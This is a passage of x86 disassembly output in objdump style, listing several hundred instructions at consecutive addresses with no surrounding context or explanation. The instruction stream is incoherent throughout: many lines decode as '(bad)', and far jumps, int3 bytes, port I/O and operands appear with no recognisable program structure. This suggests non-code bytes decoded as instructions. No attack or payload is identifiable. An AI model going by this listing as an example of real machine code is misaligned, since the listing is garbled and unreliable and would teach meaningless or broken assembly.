  4436f8:	(bad)  
  4436f9:	fild   WORD PTR [edi+0x38cc32ff]
  4436ff:	add    DWORD PTR [eax],0xffffff81
  443702:	dec    ebx
  443703:	add    BYTE PTR [ebp+0x9ccc],dl
  443709:	lods   al,BYTE PTR ds:[esi]
  44370a:	cmp    eax,0xddff0bcc
  44370f:	inc    DWORD PTR [eax]
  443711:	or     esp,esp
  443713:	add    BYTE PTR [edx-0x7d],ch
  443716:	ss int3 
  443718:	push   DWORD PTR [edx-0x2f0022]
  44371e:	in     al,dx
  44371f:	add    DWORD PTR [eax],0xffffffb7
  443722:	or     eax,DWORD PTR [ebx-0xca3325]
  443728:	add    BYTE PTR [ecx-0x4c],bl
  44372b:	and    DWORD PTR ds:0x83006aff,0x29
  443732:	xor    eax,0x47ffa7ff
  443737:	add    BYTE PTR [eax],al
  443739:	fs stc 
  44373b:	or     DWORD PTR [edi+edi*8+0x59ccffcf],0xffffff95
  443743:	add    BYTE PTR [ebp-0x7c006d01],ch
  443749:	push   edi
  44374a:	jbe    0x4436d5
  44374c:	data16 add ah,al
  44374f:	add    BYTE PTR [eax],al
  443751:	lods   eax,DWORD PTR ds:[esi]
  443752:	dec    DWORD PTR fs:[esi]
  443755:	dec    esp
  443757:	add    BYTE PTR [eax],al
  443759:	aam    0x1c
  44375b:	(bad)  
  44375c:	jmp    0x12d:0x83001e83
  443763:	push   DWORD PTR [ebx]
  443765:	call   FWORD PTR [ebp+0x728800ff]
  44376b:	int3   
  44376c:	fwait
  44376d:	jmp    esi
  44376f:	add    BYTE PTR [ecx+0x5dffdcc9],cl
  443775:	add    dl,al
  443777:	add    bh,bh
  443779:	(bad)  
  44377a:	loope  0x44377c
  44377c:	dec    eax
  44377d:	dec    DWORD PTR [esi-0x77]
  443780:	add    al,bl
  443782:	retf   
  443783:	or     DWORD PTR [edi+edi*8+0x71],0xffffff83
  443788:	call   DWORD PTR [eax+0x9830b]
  44378e:	nop
  44378f:	add    bh,bh
  443791:	sar    BYTE PTR [ebx],1
  443793:	call   DWORD PTR [ecx-0xff0c00]
  443799:	sti    
  44379a:	cmp    edi,0xff2c835c
  4437a0:	mov    DWORD PTR [ebx-0x67],ebp
  4437a3:	add    BYTE PTR [esi-0x7d],cl
  4437a6:	mov    esp,0xb6e483ff
  4437ab:	adc    DWORD PTR [edi+edi*8+0x7bff00c2],0x6
  4437b3:	sbb    DWORD PTR [edi],0xffffffff
  4437b6:	outs   dx,DWORD PTR ds:[esi]
  4437b7:	inc    DWORD PTR [eax]
  4437b9:	gs sti 
  4437bb:	adc    DWORD PTR [ecx],0xffffffff
  4437be:	sbb    eax,0x48eeffff
  4437c3:	jmp    DWORD PTR [esi]
  4437c5:	add    BYTE PTR [ebx+0x60a800ff],ah
  4437cb:	inc    DWORD PTR [esi-0x1]
  4437ce:	jmp    0x4437cf
  4437d0:	call   DWORD PTR [ebx+0x41]
  4437d3:	sbb    esp,0x0
  4437d6:	jmp    0xaaa337da
  4437db:	sbb    DWORD PTR [ebx-0x7cffd07d],0xffffffaa
  4437e2:	outs   dx,DWORD PTR ds:[esi]
  4437e3:	add    BYTE PTR [ebp+0x0],cl
  4437e6:	and    bh,bh
  4437e8:	int3   
  4437e9:	cmp    BYTE PTR [ebp-0x657c1f00],0x0
  4437f0:	int3   
  4437f1:	aad    0xdb
  4437f3:	mov    DWORD PTR [eax+eax*1+0x49],ebx
  4437f7:	add    DWORD PTR [eax],0x8
  4437fa:	or     eax,0x4589b7cc
  4437ff:	add    BYTE PTR [eax],al
  443801:	sbb    dh,bl
  443803:	int3   
  443804:	add    BYTE PTR [ebx-0x47ff0014],al
  44380a:	pop    ss
  44380b:	sbb    DWORD PTR [esi],0x0
  44380e:	sahf   
  44380f:	inc    DWORD PTR [eax]
  443811:	aas    
  443812:	inc    edx
  443813:	jmp    DWORD PTR [ebp-0x77]
  443816:	je     0x4437a1
  443818:	inc    ecx
  44381a:	xchg   ebx,eax
  44381b:	inc    edi
  44381d:	push   DWORD PTR [edi+edi*8+0x0]
  443821:	ja     0x4438a1
  443823:	add    BYTE PTR [edi],dh
  443825:	int3   
  443826:	int3   
  443827:	(bad)  
  443828:	push   DWORD PTR [ecx-0x76c40068]
  44382e:	xchg   edi,edi
  443830:	add    BYTE PTR [ebp-0x77],ch
  443833:	add    BYTE PTR [ecx],dl
  443835:	cmp    ebp,0x0
  443838:	(bad)  
  443839:	in     eax,dx
  44383a:	fmul   st,st(4)
  44383c:	adc    al,0xcc
  44383e:	lahf   
  44383f:	(bad)  
  443840:	push   DWORD PTR [eax-0x120049]
  443846:	sar    edi,1
  443848:	add    BYTE PTR [ecx+0x77],bh
  44384b:	add    BYTE PTR [ebx],bh
  44384d:	mov    edx,esi
  44384f:	(bad)  
  443850:	(bad)  
  443851:	cmp    ecx,ebp
  443853:	jmp    DWORD PTR [edx+0xff2dff]
  443859:	or     eax,0x89778308
  44385e:	retf   0xffcc
  443861:	inc    ebp
  443862:	scas   al,BYTE PTR es:[edi]
  443863:	add    BYTE PTR [edi],ch
  443865:	add    ch,bl
  443867:	add    bh,bh
  443869:	or     dl,BYTE PTR [ecx]
  44386b:	add    BYTE PTR [eax-0x7ccf00],bh
  443871:	test   al,0x45
  443873:	inc    DWORD PTR ds:0xffff2aff
  443879:	mov    esp,edx
  44387b:	(bad)  
  44387c:	(bad)  
  44387e:	arpl   sp,cx
  443880:	add    BYTE PTR [ecx+eiz*8+0x0],ah
  443884:	std    
  443885:	(bad)  
  443886:	sti    
  443887:	(bad)  
  443888:	(bad)  
  443889:	call   0x9b04ad
  44388e:	mov    ds:0x6e0dffff,al
  443893:	(bad)  
  443894:	jge    0x443895
  443896:	sub    al,BYTE PTR [ebx-0xa3df01]
  44389c:	das    
  44389d:	int3   
  44389e:	fiadd  WORD PTR [eax]
  4438a0:	int3   
  4438a1:	jmp    DWORD PTR [esi-0x1]
  4438a4:	push   0xffff7cff
  4438a9:	jmp    0x4438a5
  4438ab:	add    ah,ch
  4438ad:	call   DWORD PTR [esi]
  4438af:	add    BYTE PTR [eax],al
  4438b1:	sub    DWORD PTR [eax],edx
  4438b3:	add    BYTE PTR [eax],al
  4438b5:	int3   
  4438b6:	icebp  
  4438b7:	int3   
  4438b8:	int3   
  4438b9:	iret   
  4438ba:	mov    ebx,0x14ff6b83
  4438bf:	inc    DWORD PTR [eax]
  4438c1:	repnz test DWORD PTR [ebx-0xa6ff6a],0xffa9dfff
  4438cc:	xchg   ebx,eax
  4438cd:	add    BYTE PTR [ecx+0x7cd9ff89],dl
  4438d3:	push   ecx
  4438d5:	and    DWORD PTR [ebx-0x1],0x0
  4438d9:	jmp    FWORD PTR [edi+0x77ccd600]
  4438df:	(bad)  
  4438e0:	push   DWORD PTR [edx]
  4438e2:	in     eax,0xff
  4438e4:	jp     0x4438e6
  4438e6:	and    edi,edi
  4438e8:	add    BYTE PTR [ebx+0x12ff12],ch
  4438ee:	jl     0x4438ef
  4438f0:	(bad)  
  4438f1:	jnp    0x443926
  4438f3:	jmp    DWORD PTR [edi-0x1]
  4438f6:	mov    DWORD PTR [eax],eax
  4438f8:	add    BYTE PTR [ecx-0x2eff02],dl
  4438fe:	inc    DWORD PTR es:[eax]
  443901:	push   edi
  443902:	clc    
  443903:	push   ebp
  443905:	(bad)  
  443906:	mov    edx,0x5131ffff
  44390b:	add    BYTE PTR [edi-0x1],bh
  44390e:	cmp    edi,edi
  443910:	(bad)  
  443911:	cmp    eax,DWORD PTR [edx]
  443913:	mov    DWORD PTR [ebp-0x33d501],ebx
  443919:	pop    es
  44391a:	sub    al,BYTE PTR [eax]
  44391c:	mov    cl,ah
  44391e:	es (bad) 
  443920:	call   edi
  443922:	adc    DWORD PTR [eax],eax
  443924:	jno    0x443926
  443926:	jns    0x4438b1
  443928:	add    bl,ah
  44392a:	mov    eax,0x90cc06ff
  44392f:	(bad)  
  443930:	jmp    ebp
  443932:	cmp    cl,ah
  443934:	add    BYTE PTR [eax],0x82
  443937:	(bad)  
  443938:	call   DWORD PTR [edx-0x6b]
  44393b:	dec    DWORD PTR [edx+0xffcbff]
  443941:	in     al,0xbe
  443943:	add    BYTE PTR [ebp-0x3376ac01],ch
  443949:	sbb    al,0x25
  44394b:	(bad)  
  44394c:	jmp    0x929a:0xffffa683
  443953:	mov    DWORD PTR [ecx+0x0],edx
  443956:	es (bad) 
  443958:	dec    DWORD PTR [eax-0x54]
  44395b:	mov    ebx,esi
  44395d:	add    ch,bl
  44395f:	(bad)  
  443960:	jmp    DWORD PTR [edi]
  443962:	inc    DWORD PTR [ebx-0x800cc]
  443968:	int3   
  443969:	sti    
  44396a:	jno    0x44396b
  44396c:	and    ecx,esp
  44396e:	scas   eax,DWORD PTR es:[edi]
  44396f:	(bad)  
  443970:	call   FWORD PTR [edx+0x51]
  443973:	add    al,dl
  443975:	inc    DWORD PTR [edi+edi*8]
  443978:	cmp    DWORD PTR [edi-0x9],0x0
  44397c:	xlat   BYTE PTR ds:[ebx]
  44397d:	mov    eax,esi
  44397f:	add    bh,bh
  443981:	add    DWORD PTR [ecx+0x1f005700],0xffffffff
  443988:	add    BYTE PTR [esi+0x96fff0],bl
  44398e:	data16 add BYTE PTR [ebx+0x54890b79],al
  443995:	jmp    edx
  443997:	cmp    edi,0xffffffcf
  44399a:	push   eax
  44399b:	push   DWORD PTR ds:0x50ff
  4439a1:	dec    eax
  4439a2:	(bad)  
  4439a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4439a7:	mov    edi,edi
  4439a9:	xchg   ebx,eax
  4439aa:	push   ebx
  4439ab:	add    BYTE PTR [ecx],bl
  4439ad:	add    bh,bl
  4439af:	(bad)  
  4439b0:	(bad)  
  4439b1:	mov    BYTE PTR ds:[eax],al
  4439b4:	or     al,0x83
  4439b6:	or     esp,ecx
  4439b8:	call   DWORD PTR [ebp-0xa17609]
  4439be:	dec    sp
  4439c1:	es ins BYTE PTR es:[edi],dx
  4439c3:	mov    DWORD PTR [ecx-0x1],esi
  4439c6:	xchg   ebp,eax
  4439c7:	add    bh,bh
  4439c9:	inc    edx
  4439ca:	and    edi,edi
  4439cc:	repnz adc DWORD PTR [ebx+0x0],0xffffffff
  4439d1:	cwde   
  4439d2:	mov    edi,?
  4439d4:	dec    ebx
  4439d5:	add    BYTE PTR [edi+0x0],dh
  4439d8:	inc    esi
  4439da:	mov    bh,bh
  4439dc:	mov    WORD PTR [eax],es
  4439de:	jl     0x443969
  4439e0:	push   DWORD PTR [edx]
  4439e2:	sub    ecx,DWORD PTR [ecx+0xe50059]
  4439e8:	cmp    ebx,0xffffffbb
  4439eb:	adc    eax,0xffffffff
  4439ee:	into   
  4439ef:	inc    DWORD PTR [eax]
  4439f1:	adc    eax,0xffcbff7c
  4439f6:	dec    edi
  4439f7:	add    DWORD PTR [ebx-0x317cf5fa],0x0
  4439fe:	aaa    
  4439ff:	or     DWORD PTR [ecx+0xd834773],0xffffff83
  443a06:	mov    edi,?
  443a08:	add    BYTE PTR [edx+eax*8],dh
  443a0b:	or     DWORD PTR [edx-0x1],0x73
  443a0f:	add    bh,bh
  443a11:	xor    al,0x1e
  443a13:	mov    DWORD PTR [eax-0xffc401],ebp
  443a19:	pop    ss
  443a1a:	sti    
  443a1b:	mov    DWORD PTR [edi-0x7d],esi
  443a1e:	mov    ecx,0x7efccff
  443a23:	dec    DWORD PTR [esi]
  443a25:	dec    DWORD PTR [edx-0x7d]
  443a28:	int3   
  443a29:	stos   DWORD PTR es:[edi],eax
  443a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443a2b:	push   DWORD PTR [ebx]
  443a2d:	int3   
  443a2e:	call   0x2dde3aff
  443a33:	int3   
  443a34:	mov    ebx,0xcccc4e83
  443a39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443a3a:	das    
  443a3b:	int3   
  443a3c:	or     DWORD PTR [eax],eax
  443a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443a3f:	add    bh,bh
  443a41:	mov    eax,0xe0003e
  443a46:	mov    edi,0x61110000
  443a4b:	push   DWORD PTR [edx-0x7d]
  443a4e:	push   cs
  443a4f:	(bad)  
  443a50:	(bad)  
  443a51:	mov    edi,0x4dfff1
  443a56:	ret    
  443a57:	inc    DWORD PTR [eax]
  443a59:	icebp  
  443a5a:	inc    esp
  443a5b:	add    BYTE PTR [edi+edi*8-0x2433ff88],ch
  443a62:	cmp    cl,BYTE PTR [ecx+0x7ff1a]
  443a68:	dec    DWORD PTR [edi+edi*4-0x4e003f34]
  443a6f:	mov    DWORD PTR [eax],eax
  443a71:	and    DWORD PTR [eax+0xccd8ff],edi
  443a77:	inc    DWORD PTR [ebx-0x67ca00c]
  443a7d:	add    BYTE PTR [eax+eax*1],cl
  443a80:	call   DWORD PTR [eax]
  443a82:	add    BYTE PTR [ebx+0xed00bb],al
  443a88:	jmp    DWORD PTR [eax]
  443a8a:	xor    eax,DWORD PTR [eax]
  443a8c:	cmp    eax,0x8383a100
  443a91:	and    DWORD PTR [eax+eax*1],ebx
  443a94:	scas   eax,DWORD PTR es:[edi]
  443a95:	sbb    esp,0xffffffff
  443a98:	mov    DWORD PTR [edx+0x5a],eax
  443a9b:	add    BYTE PTR [esi],bh
  443a9d:	dec    edx
  443a9f:	int3   
  443aa0:	int3   
  443aa1:	jp     0x443a31
  443aa3:	add    DWORD PTR [edi-0xff1900],0x64
  443aaa:	mov    cl,0x0
  443aac:	dec    edi
  443aad:	jmp    DWORD PTR [ecx]
  443aaf:	add    DWORD PTR [ebx-0x647c08d5],0xffffffff
  443ab6:	inc    DWORD PTR [eax]
  443ab8:	add    BYTE PTR [ecx-0x63],al
  443abb:	(bad)  
  443abc:	jmp    0x443abd
  443abe:	xchg   edx,eax
  443abf:	inc    DWORD PTR [eax]
  443ac1:	or     BYTE PTR [ebx],dh
  443ac3:	dec    DWORD PTR [ecx+0x0]
  443ac6:	sub    eax,0xb7d70000
  443acb:	add    BYTE PTR [esi-0xff2000],ch
  443ad1:	cli    
  443ad2:	test   BYTE PTR [eax],al
  443ad4:	jle    0x443ad5
  443ad6:	mov    ds:0xb41e0000,al
  443adb:	(bad)  
  443adc:	in     eax,dx
  443add:	call   FWORD PTR [ecx+ecx*4+0x0]
  443ae1:	data16 arpl WORD PTR [eax],ax
  443ae4:	cmp    bh,bh
  443ae6:	xchg   ebx,eax
  443ae7:	add    BYTE PTR [eax],al
  443ae9:	jmp    0x83dd:0x4b83a8
  443af0:	jmp    DWORD PTR [edx+0x68]
  443af3:	dec    edi
  443af5:	push   DWORD PTR [ebx]
  443af7:	inc    DWORD PTR [ebx-0x527c82fe]
  443afd:	or     ebx,0xffffffff
  443b00:	jmp    DWORD PTR [ebx+esi*4]
  443b03:	jmp    DWORD PTR ds:0xd900
  443b09:	push   edi
  443b0a:	sahf   
  443b0b:	call   DWORD PTR [edx-0x1]
  443b0e:	pop    ds
  443b0f:	inc    DWORD PTR [eax]
  443b11:	xchg   DWORD PTR [eax+eax*1],edi
  443b14:	or     eax,0xff0c00
  443b19:	jg     0x443aa3
  443b1b:	add    BYTE PTR [edi-0x1001],al
  443b21:	fwait
  443b22:	lods   eax,DWORD PTR ds:[esi]
  443b23:	dec    DWORD PTR [ebp-0x1]
  443b26:	sbb    BYTE PTR [ecx-0xcca201],cl
  443b2c:	push   ebp
  443b2d:	add    BYTE PTR [edx],bl
  443b2f:	add    bh,bh
  443b31:	stos   BYTE PTR es:[edi],al
  443b32:	rol    DWORD PTR [eax],cl
  443b34:	xchg   esp,ecx
  443b36:	jmp    0x443b38
  443b38:	dec    DWORD PTR [eax+0x21]
  443b3b:	jmp    FWORD PTR [eax-0x1]
  443b3e:	call   0x4fff:0xa58800ff
  443b45:	and    DWORD PTR [ecx-0x6819ff01],0xffffffff
  443b4c:	inc    esp
  443b4d:	add    BYTE PTR [edi+edi*8],dh
  443b50:	(bad)  
  443b51:	fmul   DWORD PTR [ebp-0x5dff3a00]
  443b57:	cmp    edi,0x48
  443b5a:	adc    edi,edi
  443b5c:	scas   al,BYTE PTR es:[edi]
  443b5d:	mov    DWORD PTR [ebx],edx
  443b5f:	(bad)  
  443b60:	jmp    FWORD PTR [edi-0x55]
  443b63:	add    BYTE PTR [edx],cl
  443b65:	call   DWORD PTR [eax+eax*1+0x867d00]
  443b6c:	adc    al,BYTE PTR [eax]
  443b6e:	add    bh,bh
  443b70:	int3   
  443b71:	jp     0x443b6d
  443b73:	adc    DWORD PTR [esi-0x3301],0x77
  443b7a:	mov    eax,0x7100f100
  443b7f:	add    bh,bh
  443b81:	leave  
  443b82:	jbe    0x443b83
  443b84:	xchg   esi,eax
  443b85:	add    BYTE PTR [esi],dh
  443b87:	inc    DWORD PTR [ebx-0x22ff4511]
  443b8d:	mov    edi,edi
  443b8f:	dec    DWORD PTR [ecx+0x3e00f49a]
  443b95:	mov    eax,esi
  443b97:	add    ah,cl
  443b99:	cs pop esp
  443b9b:	and    DWORD PTR [ecx],0x0
  443b9e:	retf   
  443b9f:	cmp    edi,0xffffff9a
  443ba2:	add    DWORD PTR [ebx-0x7c7e008a],0xffffffff
  443ba9:	inc    ebp
  443baa:	inc    ecx
  443bab:	push   DWORD PTR [edi]
  443bad:	dec    DWORD PTR [ebx-0x1]
  443bb0:	call   DWORD PTR [edx-0xb6ff3a]
  443bb6:	sbb    BYTE PTR [ecx+0xd1ae00],cl
  443bbc:	in     al,0x0
  443bbe:	pop    edi
  443bbf:	add    bh,bh
  443bc1:	pushf  
  443bc2:	xor    al,BYTE PTR [eax]
  443bc4:	jg     0x443bc5
  443bc6:	mov    al,ds:0x32c9ff00
  443bcb:	(bad)  
  443bcc:	jl     0x443bcd
  443bce:	lock mov edi,edi
  443bd1:	jnp    0x443b7e
  443bd3:	add    ah,dl
  443bd5:	dec    DWORD PTR [ecx-0x77]
  443bd8:	add    BYTE PTR [ecx],dh
  443bda:	sbb    al,0x0
  443bdc:	add    BYTE PTR ds:0xff,al
  443be1:	iret   
  443be2:	push   ecx
  443be3:	(bad)  
  443be4:	mov    eax,0xffff84ff
  443be9:	push   0xffa1ffd0
  443bee:	mov    al,ds:0x93c8ffff
  443bf3:	(bad)  
  443bf4:	jp     0x443bf6
  443bf6:	mov    cl,0x0
  443bf8:	jmp    DWORD PTR [ebx+0x46]
  443bfb:	(bad)  
  443bfc:	in     eax,dx
  443bfd:	adc    DWORD PTR [ebp+0x0],0x0
  443c01:	into   
  443c02:	call   0x2210d706
  443c07:	add    BYTE PTR [ecx-0x63004928],cl
  443c0d:	add    BYTE PTR [eax],bl
  443c0f:	add    bh,bh
  443c11:	gs pop ss
  443c13:	(bad)  
  443c14:	(bad)  
  443c16:	pop    ebx
  443c17:	inc    DWORD PTR [eax]
  443c19:	loopne 0x443bfd
  443c1b:	and    DWORD PTR ds:0xcc897bff,0x3a
  443c22:	cmp    cl,ah
  443c24:	sbb    BYTE PTR [eax],al
  443c26:	xchg   edx,eax
  443c27:	add    BYTE PTR [ecx+0xff9356],cl
  443c2d:	push   DWORD PTR [edx]
  443c2f:	add    BYTE PTR [eax],al
  443c31:	ror    DWORD PTR [edi-0x34],cl
  443c34:	cs (bad) 
  443c36:	jmp    0xca153bbe
  443c3b:	add    bh,ch
  443c3d:	inc    DWORD PTR [esi-0x77]
  443c40:	add    BYTE PTR [ebx],cl
  443c42:	ja     0x443c44
  443c44:	push   esp
  443c45:	push   DWORD PTR [edx+0x0]
  443c48:	call   FWORD PTR [ebp-0x490057]
  443c4e:	in     al,dx
  443c4f:	inc    DWORD PTR [eax]
  443c51:	pop    ds
  443c52:	fdivr  st,st(7)
  443c54:	into   
  443c55:	jmp    DWORD PTR [ebx-0x1]
  443c58:	(bad)  
  443c59:	fst    DWORD PTR [edx]
  443c5b:	(bad)  
  443c5c:	js     0x443c5d
  443c5e:	cs (bad) 
  443c60:	call   DWORD PTR [eax]
  443c62:	cmp    edi,0x8333cc82
  443c68:	mov    DWORD PTR [esi-0x76b300f3],edx
  443c6e:	pop    DWORD PTR [eax]
  443c70:	add    BYTE PTR [edi],al
  443c72:	sbb    BYTE PTR [ebx-0x90084],al
  443c78:	add    BYTE PTR [eax+esi*4+0x32002583],cl
  443c7f:	add    BYTE PTR [ebx-0x200f4d8],al
  443c85:	jmp    FWORD PTR [edx]
  443c87:	(bad)  
  443c88:	(bad)  
  443c89:	fst    QWORD PTR [edx-0x1]
  443c8c:	mov    bl,0xff
  443c8e:	ja     0x443c8f
  443c90:	sub    DWORD PTR [edi+0x74],0xffffffff
  443c94:	mov    eax,0xffcc72ff
  443c99:	add    DWORD PTR [ecx+0x0],edi
  443c9c:	std    
  443c9d:	add    BYTE PTR [edx],al
  443c9f:	cmp    edi,0xffffffc7
  443ca2:	iret   
  443ca3:	call   DWORD PTR [edx+0x0]
  443ca6:	aad    0x0
  443ca8:	(bad)  
  443ca9:	cmp    eax,0x8600de
  443cae:	mov    cl,0xcc
  443cb0:	dec    ecx
  443cb2:	xor    BYTE PTR [eax],al
  443cb4:	adc    eax,DWORD PTR [ebx+0x5f00ffdc]
  443cba:	cld    
  443cbb:	call   FWORD PTR [esp+ecx*8+0x38]
  443cbf:	(bad)  
  443cc0:	inc    DWORD PTR [ebx+esi*8]
  443cc3:	mov    DWORD PTR [eax-0x33002201],ecx
  443cc9:	fs push cs
  443ccb:	mov    DWORD PTR [ecx],esp
  443ccd:	int3   
  443cce:	jne    0x443cd0
  443cd0:	push   esi
  443cd2:	jecxz  0x443cd3
  443cd4:	dec    ebx
  443cd5:	jmp    FWORD PTR [ebx]
  443cd7:	add    bh,bh
  443cd9:	xchg   esi,eax
  443cda:	ret    
  443cdb:	sub    edx,0x0
  443cde:	dec    esi
  443cdf:	add    BYTE PTR [ecx+0x6bff6238],cl
  443ce5:	xor    DWORD PTR [ebx-0x1],0xffffff89
  443ce9:	repz cdq 
  443ceb:	(bad)  
  443cec:	jge    0x443cee
  443cee:	adc    eax,0xd6068300
  443cf3:	int3   
  443cf4:	pusha  
  443cf5:	add    BYTE PTR [esi-0x744a0000],dl
  443cfb:	and    DWORD PTR [ecx],0xffffff89
  443cfe:	sub    ecx,DWORD PTR [ecx-0x7c85ac01]
  443d04:	add    BYTE PTR [bx+di-0x1],bh
  443d08:	add    ch,bh
  443d0a:	aam    0xff
  443d0c:	aas    
  443d0d:	add    BYTE PTR [edi],cl
  443d0f:	inc    DWORD PTR [ebx-0x59330ec9]
  443d15:	add    BYTE PTR [esi],ch
  443d17:	cmp    edi,0x4a
  443d1a:	push   ebp
  443d1b:	int3   
  443d1c:	sar    bh,0xe0
  443d1f:	or     DWORD PTR [ecx-0x3600a1f4],0xffffff83
  443d26:	scas   eax,DWORD PTR es:[edi]
  443d27:	mov    edi,edi
  443d29:	data16 xchg bh,bh
  443d2c:	cmp    cl,ah
  443d2e:	outs   dx,BYTE PTR ds:[esi]
  443d2f:	inc    DWORD PTR [eax]
  443d31:	xchg   esp,eax
  443d32:	mov    DWORD PTR [eax],0xff550047
  443d38:	mov    ebx,ecx
  443d3a:	mov    al,0x0
  443d3c:	in     al,dx
  443d3d:	mov    edi,ecx
  443d3f:	inc    DWORD PTR [eax]
  443d41:	push   eax
  443d42:	les    ecx,FWORD PTR [ecx-0x33cdff75]
  443d48:	add    DWORD PTR [esi-0x43],0xffffffff
  443d4c:	(bad)  
  443d4d:	dec    DWORD PTR [ecx+ecx*4+0x0]
  443d51:	mov    bl,0xa0
  443d53:	jmp    edi
  443d55:	add    cl,ah
  443d57:	mov    edi,edi
  443d59:	mov    ecx,0xccdbff16
  443d5e:	push   esp
  443d5f:	add    bh,bh
  443d61:	lea    eax,[esi-0x607c1377]
  443d67:	cmp    edi,0x6f
  443d6a:	and    bh,bh
  443d6c:	inc    DWORD PTR [eax]
  443d6e:	sub    al,0xff
  443d70:	jmp    FWORD PTR ds:0xff78ff7a
  443d76:	cmc    
  443d77:	add    BYTE PTR [eax],al
  443d79:	add    ebp,esp
  443d7b:	add    BYTE PTR [edx-0xff0e01],bl
  443d81:	ret    
  443d82:	lahf   
  443d83:	add    dl,cl
  443d85:	cmp    edi,0xffffff83
  443d88:	call   DWORD PTR [eax-0x7ce57cef]
  443d8e:	test   al,0xff
  443d90:	cmp    DWORD PTR [edx+ebp*2-0x7d],0xffffff8b
  443d95:	inc    DWORD PTR [ebx+0x6ce2ffff]
  443d9b:	inc    DWORD PTR [eax-0x76ffc901]
  443da1:	scas   al,BYTE PTR es:[edi]
  443da2:	mov    WORD PTR [eax],es
  443da4:	cmp    al,0x0
  443da6:	inc    DWORD PTR [bx+si]
  443da9:	xor    BYTE PTR [esi-0x1],ch
  443dac:	sbb    bh,bh
  443dae:	mov    edi,edi
  443db0:	add    BYTE PTR [esi],dh
  443db2:	jp     0x443db3
  443db4:	push   ecx
  443db5:	call   FWORD PTR [ecx+ecx*4]
  443db8:	add    DWORD PTR [ebp-0x6],0xffffff83
  443dbc:	stc    
  443dbd:	int3   
  443dbe:	mov    esi,0xb366ff00
  443dc3:	add    ch,dl
  443dc5:	dec    DWORD PTR [edi+0x425883ff]
  443dcb:	dec    DWORD PTR [esp+ecx*8]
  443dce:	outs   dx,DWORD PTR ds:[esi]
  443dcf:	add    DWORD PTR [ebx+0x28ff07d7],0x0
  443dd6:	sar    edi,1
  443dd8:	add    BYTE PTR ds:0x9800ba,dl
  443dde:	xor    eax,0x14abffff
  443de3:	sbb    DWORD PTR [ecx],0xffffffff
  443de6:	dec    eax
  443de7:	mov    DWORD PTR [ecx-0xb76047b],ecx
  443ded:	and    DWORD PTR [ecx],0x0
  443df0:	jmp    DWORD PTR [ebp-0x769fff4a]
  443df6:	inc    edx
  443df7:	int3   
  443df8:	int3   
  443df9:	xchg   esp,eax
  443dfa:	pop    eax
  443dfb:	push   DWORD PTR [ebx]
  443dfd:	add    BYTE PTR [eax-0x745d0000],bl
  443e03:	add    BYTE PTR [edx+0x0],cl
  443e06:	sar    edi,1
  443e08:	add    BYTE PTR [ebp+0x25],dl
  443e0b:	push   DWORD PTR [edi]
  443e0d:	jmp    DWORD PTR [ecx-0x36aa0100]
  443e13:	add    BYTE PTR [esi-0x1],bl
  443e16:	stc    
  443e17:	(bad)  
  443e18:	(bad)  
  443e19:	jmp    0x83fe3ef3
  443e1e:	test   DWORD PTR [eax],0xa93bff
  443e24:	and    BYTE PTR [ebx+0x7500ffc4],al
  443e2a:	popf   
  443e2b:	mov    DWORD PTR [eax+0x0],ebp
  443e2e:	xor    al,0xff
  443e30:	add    bl,dh
  443e32:	cmp    bh,bh
  443e34:	pop    ebp
  443e35:	mov    ebp,edi
  443e37:	add    DWORD PTR [eax],0x36
  443e3a:	sbb    DWORD PTR ds:[ebp-0x1],0xfffffff5
  443e3f:	add    DWORD PTR [eax],0xfffffffe
  443e42:	sbb    al,0xff
  443e44:	adc    BYTE PTR [eax],al
  443e46:	call   0x3f83:0x2b1accff
  443e4d:	sbb    DWORD PTR [ecx],0xffffffcc
  443e50:	add    BYTE PTR [edi+0x74006b],al
  443e56:	mov    eax,0x325ecc00
  443e5b:	call   DWORD PTR [ecx+0x0]
  443e5e:	sbb    DWORD PTR [eax],eax
  443e60:	add    BYTE PTR [edi-0x810019],cl
  443e66:	and    bh,bh
  443e68:	add    BYTE PTR [ecx-0xb],dh
  443e6b:	int3   
  443e6c:	dec    ebx
  443e6d:	xor    DWORD PTR [ecx],0x0
  443e70:	mov    DWORD PTR [ebx-0x63],edx
  443e73:	dec    DWORD PTR [edx-0x1]
  443e76:	add    DWORD PTR cs:[ebx-0x2e768586],0xffffffcc
  443e7e:	fdivr  st,st(7)
  443e80:	inc    DWORD PTR [ecx]
  443e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443e83:	add    BYTE PTR [edx-0xfffe77],ah
  443e89:	inc    ecx
  443e8a:	xchg   edi,edi
  443e8c:	xchg   esp,eax
  443e8d:	inc    DWORD PTR [eax-0x1]
  443e90:	int3   
  443e91:	fs (bad) 
  443e94:	into   
  443e95:	add    BYTE PTR [esi-0x29580001],al
  443e9b:	push   DWORD PTR [esi]
  443e9d:	call   FWORD PTR [edi-0x1]
  443ea0:	sub    DWORD PTR [ebp+0x33ff39],0xffffff80
  443ea7:	add    DWORD PTR [ebx-0x7e0023e5],0x0
  443eae:	sub    edi,edi
  443eb0:	sbb    DWORD PTR [ecx-0x22],0xffffff83
  443eb4:	push   ss
  443eb5:	call   FWORD PTR [ebx-0x1]
  443eb8:	add    ch,ah
  443eba:	and    eax,0x74ff9fff
  443ebf:	cmp    edi,0x70
  443ec2:	cdq    
  443ec3:	add    BYTE PTR ds:0xffdd89,bl
  443ec9:	loop   0x443ee2
  443ecb:	add    BYTE PTR [ebx+eax*4+0x57],dl
  443ecf:	inc    DWORD PTR [eax]
  443ed1:	dec    ebp
  443ed2:	add    eax,0xb5ff67cc
  443ed7:	(bad)  
  443ed8:	jmp    FWORD PTR [eax]
  443eda:	fisttp WORD PTR [ecx-0x330d3392]
  443ee0:	add    dh,dl
  443ee2:	adc    bh,bh
  443ee4:	or     al,0x0
  443ee6:	sub    eax,DWORD PTR [eax]
  443ee8:	add    ah,dl
  443eea:	or     eax,0xe3003a00
  443eef:	add    ah,cl
  443ef1:	sub    ecx,esp
  443ef3:	xor    DWORD PTR [ebx],0xffffffff
  443ef6:	out    0x0,eax
  443ef8:	add    BYTE PTR [edx+0x78],bh
  443efb:	dec    DWORD PTR [edx]
  443efd:	add    dh,dh
  443eff:	add    bh,bh
  443f01:	and    al,0xce
  443f03:	jmp    FWORD PTR [ebp+0x0]
  443f06:	xchg   esi,eax
  443f07:	mov    edi,edi
  443f09:	gs aad 0xff
  443f0c:	dec    ecx
